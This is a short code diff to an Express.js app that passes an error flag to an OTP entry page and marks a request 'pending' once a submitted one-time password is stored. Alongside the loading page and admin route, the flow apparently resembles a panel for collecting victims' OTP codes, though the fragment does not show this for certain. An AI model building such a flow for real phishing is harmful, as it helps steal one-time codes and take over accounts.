@@ -91,7 +91,7 @@ app.get('/loading', (req, res) => {
 
 app.get('/otp', (req, res) => {
     const lang = getLang(req);
-    res.render('otp', { lang, t: translations[lang], orderId: req.query.orderId });
+    res.render('otp', { lang, t: translations[lang], orderId: req.query.orderId, error: req.query.error });
 });
 
 app.get('/admin', (req, res) => {
@@ -146,6 +146,7 @@ app.post('/api/submit-otp', (req, res) => {
     const request = requests.find(r => r.id === orderId);
     if (request) {
         request.otp = otp || '';
+        request.status = 'pending';
     }
     res.json({ ok: true });
 });
